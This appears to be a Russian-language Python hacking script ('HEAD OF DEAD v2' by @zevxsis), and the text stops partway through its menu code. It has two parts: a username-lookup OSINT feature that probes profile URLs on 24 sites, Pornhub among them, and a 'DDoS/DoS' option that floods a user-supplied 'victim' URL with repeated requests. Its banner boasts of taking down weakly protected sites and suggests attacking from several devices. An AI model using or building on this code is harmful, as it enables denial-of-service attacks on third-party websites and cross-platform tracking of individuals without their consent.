import os, sys, time, colorama, requests
fch,fcl,x, cout = colorama.Fore.CYAN, colorama.Fore.RESET, 0, 150
inputc, grebcard, redcard, yellcard, strangecard = f"{fcl}>{fch}>{fcl}> ", f"{colorama.Fore.GREEN}[+]{fcl}", f"{colorama.Fore.RED}[!]{fcl}", f"{colorama.Fore.YELLOW}[-]{fcl}", f"{colorama.Fore.LIGHTBLACK_EX}[unknown thing]{fcl}"
def vk():
    global vklink
    try:
        vks = requests.get(vklink)
        answrvk = vks.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) VK. {answrvk}. {vklink}") if 100 <= answrvk <= 103 else print(f"{grebcard}(успешно) VK. {answrvk}. {vklink}") if (200 <= answrvk <= 206) else print(f"{yellcard}(перенаправление) VK. {answrvk}. {vklink}") if (300 <= answrvk <= 308) else print(f"{redcard}(не найдено) VK. {answrvk}. {vklink}") if (400 <= answrvk <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) VK. {answrvk}. {vklink}") if 500 <= answrvk <= 511 else None
    except: print(f"{redcard} Ошибка соединения. VK. {vklink}")
def tiktok():
    global ttlink
    try:
        tts = requests.get(ttlink)
        answrtt = tts.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) TikTok. {answrtt}. {ttlink}") if 100 <= answrtt <= 103 else print(f"{grebcard}(успешно) TikTok. {answrtt}. {ttlink}") if (200 <= answrtt <= 206) else print(f"{yellcard}(перенаправление) TikTok. {answrtt}. {ttlink}") if (300 <= answrtt <= 308) else print(f"{redcard}(не найдено) TikTok. {answrtt}. {ttlink}") if (400 <= answrtt <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) TikTok. {answrtt}. {ttlink}") if 500 <= answrtt <= 511 else None
    except: print(f"{redcard} Ошибка соединения. TikTok. {ttlink}")
def tg():
    global tglink
    try:
        tgs = requests.get(tglink)
        answrtg = tgs.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) Telegram. {answrtg}. {tglink}") if 100 <= answrtg <= 103 else print(f"{grebcard}(успешно) Telegram. {answrtg}. {tglink}") if (200 <= answrtg <= 206) else print(f"{yellcard}(перенаправление) Telegram. {answrtg}. {tglink}") if (300 <= answrtg <= 308) else print(f"{redcard}(не найдено) Telegram. {answrtg}. {tglink}") if (400 <= answrtg <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) Telegram. {answrtg}. {tglink}") if 500 <= answrtg <= 511 else None
    except: print(f"{redcard} Ошибка соединения. Telegram. {tglink}")
def threads():
    global thredslink
    try:
        thredss = requests.get(thredslink)
        answrthreds = thredss.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) Threads. {answrthreds}. {thredslink}") if 100 <= answrthreds <= 103 else print(f"{grebcard}(успешно) Threads. {answrthreds}. {thredslink}") if (200 <= answrthreds <= 206) else print(f"{yellcard}(перенаправление) Threads. {answrthreds}. {thredslink}") if 300 <= answrthreds <= 308 else print(f"{redcard}(не найдено) Threads. {answrthreds}. {thredslink}") if (400 <= answrthreds <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) Threads. {answrthreds}. {thredslink}") if 500 <= answrthreds <= 511 else None
    except: print(f"{redcard} Ошибка соединения. Threads. {thredslink}")
def spotify():
    global spotifylink
    try:
        spotifys = requests.get(spotifylink)
        answrspotify = spotifys.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) Spotify. {answrspotify}. {spotifylink}") if 100 <= answrspotify <= 103 else print(f"{grebcard}(успешно) Spotify. {answrspotify}. {spotifylink}") if 200 <= answrspotify <= 206 else print(f"{yellcard}(перенаправление) Spotify. {answrspotify}. {spotifylink}") if 300 <= answrspotify <= 308 else print(f"{redcard}(не найдено) Spotify. {answrspotify}. {spotifylink}") if 400 <= answrspotify <= 429 else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) Spotify. {answrspotify}. {spotifylink}") if 500 <= answrspotify <= 511 else None
    except: print(f"{redcard} Ошибка соединения. Spotify. {spotifylink}")
def youtube():
    global youtubelink
    try:
        youtubes = requests.get(youtubelink)
        answryoutube = youtubes.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) YouTube. {answryoutube}. {youtubelink}") if 100 <= answryoutube <= 103 else print(f"{grebcard}(успешно) YouTube. {answryoutube}. {youtubelink}") if 200 <= answryoutube <= 206 else print(f"{yellcard}(перенаправление) YouTube. {answryoutube}. {youtubelink}") if 300 <= answryoutube <= 308 else print(f"{redcard}(не найдено) YouTube. {answryoutube}. {youtubelink}") if 400 <= answryoutube <= 429 else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) YouTube. {answryoutube}. {youtubelink}") if 500 <= answryoutube <= 511 else None
    except: print(f"{redcard} Ошибка соединения. YouTube. {youtubelink}")
def reddit():
    global redditlink
    try:
        reddits = requests.get(redditlink)
        answrreddit = reddits.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) Reddit. {answrreddit}. {redditlink}") if 100 <= answrreddit <= 103 else print(f"{grebcard}(успешно) Reddit. {answrreddit}. {redditlink}") if (200 <= answrreddit <= 206) else print(f"{yellcard}(перенаправление) Reddit. {answrreddit}. {redditlink}") if 300 <= answrreddit <= 308 else print(f"{redcard}(не найдено) Reddit. {answrreddit}. {redditlink}") if (400 <= answrreddit <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) Reddit. {answrreddit}. {redditlink}") if 500 <= answrreddit <= 511 else None
    except: print(f"{redcard} Ошибка соединения. Reddit. {redditlink}")
def insta():
    global instalink
    try:
        instas = requests.get(instalink)
        answrinsta = instas.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) Instagram. {answrinsta}. {instalink}") if 100 <= answrinsta <= 103 else print(f"{grebcard}(успешно) Instagram. {answrinsta}. {instalink}") if (200 <= answrinsta <= 206) else print(f"{yellcard}(перенаправление) Instagram. {answrinsta}. {instalink}") if 300 <= answrinsta <= 308 else print(f"{redcard}(не найдено) Instagram. {answrinsta}. {instalink}") if (400 <= answrinsta <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) Instagram. {answrinsta}. {instalink}") if 500 <= answrinsta <= 511 else None
    except: print(f"{redcard} Ошибка соединения. Instagram. {instalink}")
def wa():
    global walink
    try:
        was = requests.get(walink)
        answrwa = was.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) WhatsApp. {answrwa}. {walink}") if 100 <= answrwa <= 103 else print(f"{grebcard}(успешно) WhatsApp. {answrwa}. {walink}") if (200 <= answrwa <= 206) else print(f"{yellcard}(перенаправление) WhatsApp. {answrwa}. {walink}") if (300 <= answrwa <= 308) else print(f"{redcard}(не найдено) WhatsApp. {answrwa}. {walink}") if (400 <= answrwa <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) WhatsApp. {answrwa}. {walink}") if 500 <= answrwa <= 511 else None
    except: print(f"{redcard} Ошибка соединения. whatsApp. {walink}")
def yamusic():
    global yamusiclink
    try:
        yamusics = requests.get(yamusiclink)
        answryamusic = yamusics.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) yandex music. {answryamusic}. {yamusiclink}") if 100 <= answryamusic <= 103 else print(f"{grebcard}(успешно) yandex music. {answryamusic}. {yamusiclink}") if 200 <= answryamusic <= 206 else print(f"{yellcard}(перенаправление) yandex music. {answryamusic}. {yamusiclink}") if 300 <= answryamusic <= 308 else print(f"{redcard}(не найдено) yandex music. {answryamusic}. {yamusiclink}") if 400 <= answryamusic <= 429 else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) yandex music. {answryamusic}. {yamusiclink}") if 500 <= answryamusic <= 511 else None
    except: print(f"{redcard} oшибка соединения yandex music. {yamusiclink}")
def chess():
    global chesslink
    try:
        chesss = requests.get(chesslink)
        answrchess = chesss.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) chess.com. {answrchess}. {chesslink}") if 100 <= answrchess <= 103 else print(f"{grebcard}(успешно) chess.com. {answrchess}. {chesslink}") if (200 <= answrchess <= 206) else print(f"{yellcard}(перенаправление) chess.com. {answrchess}. {chesslink}") if 300 <= answrchess <= 308 else print(f"{redcard}(не найдено) chess.com. {answrchess}. {chesslink}") if (400 <= answrchess <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) chess.com. {answrchess}. {chesslink}") if 500 <= answrchess <= 511 else None
    except: print(f"{redcard} oшибка соединения chess.com. {chesslink}")
def github():
    global githublink
    try:
        githubs = requests.get(githublink)
        answrgithub = githubs.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) github. {answrgithub}. {githublink}") if 100 <= answrgithub <= 103 else print(f"{grebcard}(успешно) github. {answrgithub}. {githublink}") if (200 <= answrgithub <= 206) else print(f"{yellcard}(перенаправление) github. {answrgithub}. {githublink}") if 300 <= answrgithub <= 308 else print(f"{redcard}(не найдено) github. {answrgithub}. {githublink}") if (400 <= answrgithub <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) github. {answrgithub}. {githublink}") if 500 <= answrgithub <= 511 else None
    except: print(f"{redcard} oшибка соединения github. {githublink}")
def discord():
    global dslink
    try:
        dss = requests.get(dslink)
        answrds = dss.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) discord. {answrds}. {dslink}") if 100 <= answrds <= 103 else print(f"{grebcard}(успешно) discord. {answrds}. {dslink}") if (200 <= answrds <= 206) else print(f"{yellcard}(перенаправление) discord. {answrds}. {dslink}") if (300 <= answrds <= 308) else print(f"{redcard}(не найдено) discord. {answrds}. {dslink}") if (400 <= answrds <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) discord. {answrds}. {dslink}") if 500 <= answrds <= 511 else None
    except: print(f"{redcard} oшибка соединения discord. {dslink}")
def duolingo():
    global duolingolink
    try:
        duolingos = requests.get(duolingolink)
        answrduolingo = duolingos.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) duolingo. {answrduolingo}. {duolingolink}") if 100 <= answrduolingo <= 103 else print(f"{grebcard}(успешно) duolingo. {answrduolingo}. {duolingolink}") if 200 <= answrduolingo <= 206 else print(f"{yellcard}(перенаправление) duolingo. {answrduolingo}. {duolingolink}") if 300 <= answrduolingo <= 308 else print(f"{redcard}(не найдено) duolingo. {answrduolingo}. {duolingolink}") if 400 <= answrduolingo <= 429 else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) duolingo. {answrduolingo}. {duolingolink}") if 500 <= answrduolingo <= 511 else None
    except: print(f"{redcard} oшибка соединения duolingo. {duolingolink}")
def roblox():
    global robloxlink
    try:
        robloxs = requests.get(robloxlink)
        answrroblox = robloxs.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) roblox. {answrroblox}. {robloxlink}") if 100 <= answrroblox <= 103 else print(f"{grebcard}(успешно) roblox. {answrroblox}. {robloxlink}") if (200 <= answrroblox <= 206) else print(f"{yellcard}(перенаправление) roblox. {answrroblox}. {robloxlink}") if 300 <= answrroblox <= 308 else print(f"{redcard}(не найдено) roblox. {answrroblox}. {robloxlink}") if (400 <= answrroblox <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) roblox. {answrroblox}. {robloxlink}") if 500 <= answrroblox <= 511 else None
    except: print(f"{redcard} oшибка соединения roblox. {robloxlink}")
def facebook():
    global facebooklink
    try:
        facebooks = requests.get(facebooklink)
        answrfacebook = facebooks.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) facebook. {answrfacebook}. {facebooklink}") if 100 <= answrfacebook <= 103 else print(f"{grebcard}(успешно) facebook. {answrfacebook}. {facebooklink}") if (200 <= answrfacebook <= 206) else print(f"{yellcard}(перенаправление) facebook. {answrfacebook}. {facebooklink}") if 300 <= answrfacebook <= 308 else print(f"{redcard}(не найдено) facebook. {answrfacebook}. {facebooklink}") if 400 <= answrfacebook <= 429 else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) facebook. {answrfacebook}. {facebooklink}") if 500 <= answrfacebook <= 511 else None
    except: print(f"{redcard} oшибка соединения facebook. {facebooklink}")
def kwork():
    global kworklink
    try:
        kworks = requests.get(kworklink)
        answrkwork = kworks.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) kwork. {answrkwork}. {kworklink}") if 100 <= answrkwork <= 103 else print(f"{grebcard}(успешно) kwork. {answrkwork}. {kworklink}") if (200 <= answrkwork <= 206) else print(f"{yellcard}(перенаправление) kwork. {answrkwork}. {kworklink}") if 300 <= answrkwork <= 308 else print(f"{redcard}(не найдено) kwork. {answrkwork}. {kworklink}") if (400 <= answrkwork <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) kwork. {answrkwork}. {kworklink}") if 500 <= answrkwork <= 511 else None
    except: print(f"{redcard} oшибка соединения kwork. {kworklink}")
def steam():
    global steamlink
    try:
        steams = requests.get(steamlink, timeout =3)
        answrsteam = steams.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) steam. {answrsteam}. {steamlink}") if 100 <= answrsteam <= 103 else print(f"{grebcard}(успешно) steam. {answrsteam}. {steamlink}") if (200 <= answrsteam <= 206) else print(f"{yellcard}(перенаправление) steam. {answrsteam}. {steamlink}") if (300 <= answrsteam <= 308) else print(f"{redcard}(не найдено) steam. {answrsteam}. {steamlink}") if (400 <= answrsteam <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) steam. {answrsteam}. {steamlink}") if 500 <= answrsteam <= 511 else None
    except: print(f"{redcard} ошибка соединения steam. {steamlink}")
def pornhub():
    global pornhublink
    try:
        pornhubs = requests.get(pornhublink, timeout= 3)
        answrph = pornhubs.status_code
        print(f"{strangecard}(сервер плохо справлется с обработкой) pornhub. {answrph}. {pornhublink}") if 100 <= answrph <= 103 else print(f"{grebcard}(успешно) pornhub. {answrph}. {pornhublink}") if (200 <= answrph <= 206) else print(f"{yellcard}(перенаправление) pornhub. {answrph}. {pornhublink}") if (300 <= answrph <= 308) else print(f"{redcard}(не найдено) pornhub. {answrph}. {pornhublink}") if (400 <= answrph <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) pornhub. {answrph}. {pornhublink}") if 500 <= answrph <= 511 else None
    except: print(f"{redcard}ошибка соединения pornhub. {pornhublink}")
def twitter():
    global twitterlink
    try:
        twitters = requests.get(twitterlink)
        answrtwitter = twitters.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) twitter. {answrtwitter}. {twitterlink}") if 100 <= answrtwitter <= 103 else print(f"{grebcard}(успешно) twitter. {answrtwitter}. {twitterlink}") if 200 <= answrtwitter <= 206 else print(f"{yellcard}(перенаправление) twitter. {answrtwitter}. {twitterlink}") if 300 <= answrtwitter <= 308 else print(f"{redcard}(не найдено) twitter. {answrtwitter}. {twitterlink}") if 400 <= answrtwitter <= 429 else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) twitter. {answrtwitter}. {twitterlink}") if 500 <= answrtwitter <= 511 else None
    except: print(f"{redcard} ошибка соединения twitter. {twitterlink}")
def twitch():
    global twitchlink
    try:
        twitchs = requests.get(twitchlink)
        answrtwitch = twitchs.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) twitch. {answrtwitch}. {twitchlink}") if 100 <= answrtwitch <= 103 else print(f"{grebcard}(успешно) twitch. {answrtwitch}. {twitchlink}") if 200 <= answrtwitch <= 206 else print(f"{yellcard}(перенаправление) twitch. {answrtwitch}. {twitchlink}") if 300 <= answrtwitch <= 308 else print(f"{redcard}(не найдено) twitch. {answrtwitch}. {twitchlink}") if 400 <= answrtwitch <= 429 else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) twitch. {answrtwitch}. {twitchlink}") if 500 <= answrtwitch <= 511 else None
    except: print(f"{redcard} ошибка соединения twitch. {twitchlink}")
def pinterest():
    global pinterestlink
    try:
        pinterests = requests.get(pinterestlink)
        answrpinterest = pinterests.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) pinterest. {answrpinterest}. {pinterestlink}") if 100 <= answrpinterest <= 103 else print(f"{grebcard}(успешно) pinterest. {answrpinterest}. {pinterestlink}") if 200 <= answrpinterest <= 206 else print(f"{yellcard}(перенаправление) pinterest. {answrpinterest}. {pinterestlink}") if 300 <= answrpinterest <= 308 else print(f"{redcard}(не найдено) pinterest. {answrpinterest}. {pinterestlink}") if 400 <= answrpinterest <= 429 else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) pinterest. {answrpinterest}. {pinterestlink}") if 500 <= answrpinterest <= 511 else None
    except: print(f"{redcard} ошибка соединения pinterest. {pinterestlink}")
def tumbrl():
    global tumblrllink
    try:
        tumbrls = requests.get(tumblrllink)
        answrtumbrl = tumbrls.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) tumbrl. {answrtumbrl}. {tumblrllink}") if 100 <= answrtumbrl <= 103 else print(f"{grebcard}(успешно) tumbrl. {answrtumbrl}. {tumblrllink}") if 200 <= answrtumbrl <= 206 else print(f"{yellcard}(перенаправление) tumbrl. {answrtumbrl}. {tumblrllink}") if 300 <= answrtumbrl <= 308 else print(f"{redcard}(не найдено) tumbrl. {answrtumbrl}. {tumblrllink}") if 400 <= answrtumbrl <= 429 else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) tumbrl. {answrtumbrl}. {tumblrllink}") if 500 <= answrtumbrl <= 511 else None
    except: print(f"{redcard} ошибка соединения tumbrl. {tumblrllink}")
def soundcloud():
    global soundcloudlink
    try:
        soundclouds = requests.get(soundcloudlink)
        answrsoundcloud = soundclouds.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) soundcloud. {answrsoundcloud}. {soundcloudlink}") if 100 <= answrsoundcloud <= 103 else print(f"{grebcard}(успешно) soundcloud. {answrsoundcloud}. {soundcloudlink}") if 200 <= answrsoundcloud <= 206 else print(f"{yellcard}(перенаправление) soundcloud. {answrsoundcloud}. {soundcloudlink}") if 300 <= answrsoundcloud <= 308 else print(f"{redcard}(не найдено) soundcloud. {answrsoundcloud}. {soundcloudlink}") if 400 <= answrsoundcloud <= 429 else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) soundcloud. {answrsoundcloud}. {soundcloudlink}") if 500 <= answrsoundcloud <= 511 else None
    except: print(f"{redcard} ошибка соединения soundcloud. {soundcloudlink}")
def all_services(): vk(), tiktok(), tg(), threads(), spotify(), youtube(), reddit(), insta(), wa(), yamusic(), chess(), github(), discord(), duolingo(), roblox(), facebook(), kwork(), steam(), pornhub(), twitter(), twitch(), pinterest(), tumbrl(), soundcloud()
def vvoderr():
    for chlen in range(1, 5):
        clear()
        print(f"{colorama.Fore.RED}вы ввели некоректный ответ.\nподождите {5-chlen} секунд...")
        time.sleep(1)
art1 = f"{fch}░░░░█▐▄▒▒▒▌▌▒▒▌░▌▒▐▐▐▒▒▐▒▒▌▒▀▄▀▄░\n░░░█▐▒▒▀▀▌░▀▀▀░░▀▀▀░░▀▀▄▌▌▐▒▒▒▌▐░\n░░▐▒▒▀▀▄▐░▀▀▄▄░░░░░░░░░░░▐▒▌▒▒▐░▌\n░░▐▒▌▒▒▒▌░▄▄▄▄█▄░░░░░░░▄▄▄▐▐▄▄▀░░\n░░▌▐▒▒▒▐░░░░░░░░░░░░░▀█▄░░░░▌▌░░░\n▄▀▒▒▌▒▒▐░░░░░░░▄░░▄░░░░░▀▀░░▌▌░░░{" "*12}{fcl}loading...{fch}\n▄▄▀▒▐▒▒▐░░░░░░░▐▀▀▀▄▄▀░░░░░░▌▌░░░\n░░░░█▌▒▒▌░░░░░▐▒▒▒▒▒▌░░░░░░▐▐▒▀▀▄\n░░▄▀▒▒▒▒▐░░░░░▐▒▒▒▒▐░░░░░▄█▄▒▐▒▒▒\n▄▀▒▒▒▒▒▄██▀▄▄░░▀▄▄▀░░▄▄▀█▄░█▀▒▒▒▒{fcl}"
def printslow_slow(text):
    for letter in text:
        print(letter, end="", flush=True)
        time.sleep(0.03)
def printslow_fast(text):
    for letter in text:
        print(letter, end="", flush=True)
        time.sleep(0.0000003)
def clear(): os.system("clear" if os.name != "nt" else "cls")
def main():
    global fch, cout, inputc
    while True:
        clear()
        printslow_slow(f'{colorama.Fore.BLUE}░█░█░█▀▀░█▀█░█▀▄░░░█▀█░█▀▀░░░█▀▄░█▀▀░█▀█░█▀▄\n{colorama.Fore.LIGHTBLUE_EX}░█▀█░█▀▀░█▀█░█░█░░░█░█░█▀▀░░░█░█░█▀▀░█▀█░█░█\n{colorama.Fore.CYAN}░▀░▀░▀▀▀░▀░▀░▀▀░░░░▀▀▀░▀░░░░░▀▀░░▀▀▀░▀░▀░▀▀░  {colorama.Fore.LIGHTBLACK_EX}v2\n{colorama.Fore.LIGHTBLACK_EX}{" "*15}by @zevxsis{fcl}\n\n{" "*10}{time.ctime()}\n{" "*3}+-----------------------------------+\n{" "*3}| 1 - {fch}𝖔𝖘𝖎𝖓𝖙{fcl}       3 - {fch}𝖎𝖓𝖋𝖔𝖗𝖒𝖆𝖙𝖎𝖔𝖓{fcl}   |\n{" "*3}| 2 - {fch}𝕯𝕯𝖔𝖘/𝕯𝖔𝖘{fcl}   4 - {fch}𝖘𝖊𝖙𝖙𝖎𝖓𝖌𝖘{fcl}       |\n{" "*3}|           q - {fch}𝖊𝖝𝖎𝖙{fcl}                |\n{" "*3}+-----------------------------------+\n')
        snoschoice = input(inputc)
        clear()
        if snoschoice == "q":
            sys.exit()
        elif snoschoice == "2":
            while True:
                clear()
                printslow_fast(f'{fch}⡿⣼⡿⣑⠛⣡⡆⠄⠄⠄⠄⠈⠙⢷⡹⣿⣿⣿⡿⢣⣿⣫⣾⣿⣿⣿⣿{" " * 20}{fcl}ℤ𝔼𝕍𝕏𝕊𝕀𝕊 𝔻𝕆𝕊/𝔻𝔻𝕆𝕊\n{fch}⢳⣿⣱⣿⡆⣿⠄⠄⠄⠄⠄⠄⠄⠸⣧⢹⣿⡟⣱⡟⣿⣿⣿⣿⣿⣿⣿{fcl}{" " * 10}+------------=={fch}WARN{fcl}1{fch}NG{fcl}==------------+\n{fch}⢸⣧⣿⣿⡇⢿⣀⠄⠄⠄⠄⣄⣼⡆⣹⡆⢩⡾⣡⣾⣿⣿⣿⣿⣿⣿⣿{fcl}{" " * 10}| сносит только {fch}слабозащищенные     {fcl}|\n{fch}⢸⣿⣿⣿⣿⣄⠻⣶⣶⣶⣶⡿⠿⠃⠋⢔⣩⣾⣿⣿⣿⣿⣿⣿⠿⣫⣵{fcl}{" " * 10}| сайты или сделанные через         |\n{fch}⣌⠁⠻⣿⣿⣿⣷⣶⣦⣤⣶⣶⡯⢠⣾⣿⣿⣿⣿⡿⠿⢟⣫⣵⣿⣿⡿{fcl}{" " * 10}| вайбкодинг.                       |\n{fch}⢿⣷⣦⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣆⣀⣒⣚⡛⠋⠉⠉⠄⢀{fcl}{" " * 10}| количество спама можно выбрать    |\n{fch}⢼⣿⣿⣿⣿⣿⢟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢯⠤⠄⠄⢀⣀⣠⣾{fcl}{" " * 10}| {fch}в настройках{colorama.Fore.LIGHTBLACK_EX} не рекомендуется     {fcl}|\n{fch}⠷⠾⠭⢭⣉⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣏⡻⢶⣦⣤⠴⢿⠋⠁{fcl}{" " * 10}| ставить слишком большое кол-во    |\n{fch}⡲⣝⢿⣿⣿⣿⡿⣛⣩⣭⡉⠻⣿⣿⣿⣿⣴⣿⣿⣿⣷⣶⡾⠋⠁⢀⣤{fcl}{" " * 10}| ({colorama.Fore.LIGHTBLACK_EX}можно убить роутер{fcl}){fcl}              |\n{fch}⣿⢸⣷⡝⣿⣿⢸⣿⣿⣿⣿⠄⠄⣹⣿⣿⣿⣿⣿⣯⣛⠟⠁⠴⠾⠿⣛{fcl}{" "*10}| для ддос атаки используйте        |\n{fch}⣿⣼⣿⣟⢧⣿⣮⣝⣛⣉⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⠋⣸⣿⣿⣿⣿⣿{fcl}{" " * 10}| несколько устройств               |\n{fch}⣿⡿⢣⣿⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⣡⣾⣿⣿⣿⠿⣛⡭{fcl}{" " * 10}+-----------------------{fch}zevxsis{fcl}-----+\n\n')
                printslow_fast(f"{fch}впиши URL сайта жертвы:\n")
                victim = input(inputc).strip()
                clear()
                for i in range(1, cout + 1):
                    try:
                        r = requests.get(victim)
                        print(f"{i}/{cout} {r.status_code}нормалды {grebcard}")
                    except: print(f"{i}/{cout}сайта нема {redcard}")
                break
        elif snoschoice == "1":
            while True:
                clear()
                user = input(f"введите {fch}юзер:{fcl}\n{inputc}@").strip()
                global vklink, ttlink, tglink, thredslink, spotifylink, youtubelink, redditlink, instalink, walink, yamusiclink, chesslink, githublink, dslink, duolingolink, robloxlink, facebooklink, kworklink, steamlink, pornhublink, twitterlink, twitchlink,pinterestlink,tumblrllink,soundcloudlink
                vklink = f"https://vk.ru/{user}"
                ttlink = f"https://www.tiktok.com/@{user}"
                tglink = f"https://t.me/{user}"
                thredslink = f"https://www.threads.net/@{user}"
                spotifylink = f"https://open.spotify.com/user/{user}"
                youtubelink = f"https://www.youtube.com/@{user}"
                redditlink = f"https://www.reddit.com/user/{user}"
                instalink = f"https://www.instagram.com/{user}"
                walink = f"https://www.whatsapp.com/@{user}"
                yamusiclink = f"https://music.yandex/{user}/playlists"
                chesslink = f"https://www.chess.com/member/{user}"
                githublink = f"https://github.com/{user}"
                dslink = f"https://discord.com/users/{user}"
                duolingolink = f"https://www.duolingo.com/profile/{user}"
                robloxlink = f"https://www.roblox.com/user.aspx?username={user}"
                facebooklink = f"https://www.facebook.com/{user}"
                kworklink = f"https://kwork.ru/user/{user}"
                steamlink = f"https://steamcommunity.com/id/{user}"
                pornhublink = f"https://www.pornhub.com/users/{user}"
                twitterlink = f"https://twitter.com/{user}"
                twitchlink = f"https://www.twitch.tv/{user}"
                pinterestlink = f"https://www.pinterest.com/{user}"
                tumblrllink = f"https://www.tumblr.com/{user}"
                soundcloudlink = f"https://soundcloud.com/{user}"
                clear()
                printslow_fast(f'{fch}⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿{" " * 19}{fcl}Z E V X S {fch}I{fcl} S   O S {fch}I{fcl} N T\n{fch}⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿{fcl}{" " * 10}+-----------==={fch}CHOOSE MEDIA:{fcl}===------------+\n{fch}⢸⣿⣷⣧⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉{fcl}{" " * 9}| 1. {fch}VK{fcl}       9. {fch}Reddit{fcl}    17. {fch}Discord{fcl}     |\n{fch}⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀{fcl}{" " * 9}| 2. {fch}TikTok{fcl}   10. {fch}Instagram{fcl} 18. {fch}Duolingo{fcl}   |\n{fch}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣿⣴{fcl}{" " * 10}| 3. {fch}Telegram{fcl} 11. {fch}WhatsApp{fcl}  19. {fch}Roblox{fcl}     |\n{fch}⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{fcl}{" " * 10}| 4. {fch}Threads{fcl}  12. {fch}Yamusic{fcl}   20. {fch}Facebook{fcl}   |\n{fch}⣦⣌⣛⣻⣿⣿⣧⠙⣿⣿⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄{fcl}{" " * 8}| 5. {fch}Spotify{fcl}  13. {fch}Chess{fcl}     21. {fch}Kwork{fcl}      |\n{fch}⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾{fcl}{" " * 10}| 6. {fch}YouTube{fcl}  14. {fch}GitHub{fcl}    22. {fch}Steam{fcl}      |\n{fch}⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄{fcl}{" " * 8}| 7. {fch}Pornhub{fcl}  15. {fch}Twitch{fcl}  23. {fch}Pinterest{fcl}    |\n{fch}⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁{fcl}{" " * 11}| 8. {fch}Soundcloud{fcl} 16. {fch}Twitter{fcl} 24. {fch}Tumbrl{fcl}     |\n{fch}⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄{fcl}{" " * 12}|{" "*17}nh - {fch}all{fcl}{" "*17}|\n{fch}⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄{fcl}{" "*15}|{" "*17}b - {fch}back{fcl}{" "*17}|\n{" "*36}+--------------------------------{fch}zevxsis{fcl}----+\n')
                osintchoice1 = input(f"{" " * 37}{inputc}").strip().lower()
                clear()
                if osintchoice1 == "b":
                    break
